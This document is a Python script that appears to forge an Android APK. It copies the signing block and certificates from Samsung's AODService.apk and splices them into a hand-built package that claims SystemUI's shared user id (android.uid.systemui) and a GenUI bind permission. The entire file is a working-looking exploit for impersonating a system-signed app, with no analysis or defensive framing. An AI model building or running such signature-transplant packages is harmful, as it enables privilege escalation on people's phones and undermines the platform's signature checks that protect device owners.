import zipfile, struct

# Read the APK Signing Block (v2/v3) and META-INF certificates from within AODService.apk.
aod_path = r"location of pulled apk file"
with open(aod_path, "rb") as f:
    aod_bytes = f.read()

eocd_off = aod_bytes.rfind(b"PK\x05\x06")
cd_size, cd_off = struct.unpack_from("<II", aod_bytes, eocd_off + 12)
block_size = struct.unpack_from("<Q", aod_bytes, cd_off - 24)[0]
sig_block = aod_bytes[cd_off - block_size - 8 : cd_off]

with zipfile.ZipFile(aod_path, "r") as z:
    cert_rsa = z.read("META-INF/CERT.RSA")
    cert_sf = z.read("META-INF/CERT.SF")
    manifest_mf = z.read("META-INF/MANIFEST.MF")

# Binary AndroidManifest.xml (AXML) String Pool and Resource IDs
strings = [
    "sharedUserId",      # 0 (0x0101000b)
    "versionCode",       # 1 (0x0101021b)
    "versionName",       # 2 (0x0101021c)
    "name",              # 3 (0x01010003)
    "hasCode",           # 4 (0x0101000c)
    "minSdkVersion",     # 5 (0x0101020c)
    "targetSdkVersion",  # 6 (0x01010270)
    "android",           # 7
    "http://schemas.android.com/apk/res/android", # 8
    "",                  # 9
    "package",           # 10
    "manifest",          # 11
    "com.samsung.android.systemui.genuibridge", # 12
    "android.uid.systemui", # 13
    "1.0",               # 14
    "uses-sdk",          # 15
    "uses-permission",   # 16
    "com.samsung.android.smartsuggestions.permission.BIND_GENUI_SERVICE", # 17
    "application",       # 18
]

res_ids = [
    0x0101000b, # sharedUserId
    0x0101021b, # versionCode
    0x0101021c, # versionName
    0x01010003, # name
    0x0101000c, # hasCode
    0x0101020c, # minSdkVersion
    0x01010270, # targetSdkVersion
]

# Creating a UTF-16LE String Pool Chunk (0x0001)
str_blobs, offsets, cur = [], [], 0
for s in strings:
    offsets.append(cur)
    b = s.encode("utf-16le")
    blob = struct.pack("<H", len(s)) + b + b"\x00\x00"
    str_blobs.append(blob)
    cur += len(blob)
all_str_data = b"".join(str_blobs)
while len(all_str_data) % 4 != 0:
    all_str_data += b"\x00"

sp_header_size = 28
sp_str_start = sp_header_size + len(strings) * 4
sp_size = sp_str_start + len(all_str_data)
sp_chunk = struct.pack("<HHIIIIII", 0x0001, sp_header_size, sp_size, len(strings), 0, 0, sp_str_start, 0)
sp_chunk += b"".join(struct.pack("<I", o) for o in offsets) + all_str_data

# Resource Map Chunk (0x0180)
res_size = 8 + len(res_ids) * 4
res_chunk = struct.pack("<HHI", 0x0180, 8, res_size) + b"".join(struct.pack("<I", r) for r in res_ids)

def make_attr(ns, name, raw_val, val_type, data_val):
    return struct.pack("<IIIHBBI", ns, name, raw_val, 8, 0, val_type, data_val)

def start_elem(name, attrs):
    attr_bytes = b"".join(attrs)
    size = 36 + len(attr_bytes)
    hdr = struct.pack("<HHIII", 0x0102, 16, size, 1, 0xFFFFFFFF)
    body = struct.pack("<IIHHHHHH", 0xFFFFFFFF, name, 20, 20, len(attrs), 0, 0, 0)
    return hdr + body + attr_bytes

def end_elem(name):
    return struct.pack("<HHIIIII", 0x0103, 16, 24, 1, 0xFFFFFFFF, 0xFFFFFFFF, name)

def ns_chunk(is_start, prefix, uri):
    return struct.pack("<HHIIIII", 0x0100 if is_start else 0x0101, 16, 24, 1, 0xFFFFFFFF, prefix, uri)

TYPE_STRING, TYPE_INT_DEC, TYPE_INT_BOOLEAN = 0x03, 0x10, 0x12

# Binary xml

xml_body = b"".join([
    sp_chunk,
    res_chunk,
    ns_chunk(True, 7, 8),
    start_elem(11, [
        make_attr(8, 0, 13, TYPE_STRING, 13),           # android:sharedUserId="android.uid.systemui"
        make_attr(8, 1, 0xFFFFFFFF, TYPE_INT_DEC, 1),   # android:versionCode="1"
        make_attr(8, 2, 14, TYPE_STRING, 14),           # android:versionName="1.0"
        make_attr(0xFFFFFFFF, 10, 12, TYPE_STRING, 12), # package="com.samsung.android.systemui.genuibridge"
    ]),
    start_elem(15, [
        make_attr(8, 5, 0xFFFFFFFF, TYPE_INT_DEC, 34),  # android:minSdkVersion="34"
        make_attr(8, 6, 0xFFFFFFFF, TYPE_INT_DEC, 36),  # android:targetSdkVersion="36"
    ]),
    end_elem(15),
    start_elem(16, [
        make_attr(8, 3, 17, TYPE_STRING, 17),           # android:name="...BIND_GENUI_SERVICE"
    ]),
    end_elem(16),
    start_elem(18, [
        make_attr(8, 4, 0xFFFFFFFF, TYPE_INT_BOOLEAN, 0), # android:hasCode="false"
    ]),
    end_elem(18),
    end_elem(11),
    ns_chunk(False, 7, 8),
])

axml = struct.pack("<HHI", 0x0003, 8, 8 + len(xml_body)) + xml_body

# Create a ZIP archive and inject the Samsung signature block (sig_block).
tmp_zip = r"C:\Users\furki\AppData\Local\Temp\GenUIBridge_raw.apk"
with zipfile.ZipFile(tmp_zip, "w", zipfile.ZIP_DEFLATED) as z:
    z.writestr("AndroidManifest.xml", axml)
    z.writestr("META-INF/MANIFEST.MF", manifest_mf)
    z.writestr("META-INF/CERT.SF", cert_sf)
    z.writestr("META-INF/CERT.RSA", cert_rsa)

with open(tmp_zip, "rb") as f:
    raw = f.read()

eocd = raw.rfind(b"PK\x05\x06")
cd_sz, cd_offset = struct.unpack_from("<II", raw, eocd + 12)
new_cd_offset = cd_offset + len(sig_block)
new_eocd = raw[eocd:eocd+16] + struct.pack("<I", new_cd_offset) + raw[eocd+20:]
final_apk = raw[:cd_offset] + sig_block + raw[cd_offset:eocd] + new_eocd

out_apk = r"GenUIBridge.apk"
with open(out_apk, "wb") as f:
    f.write(final_apk)
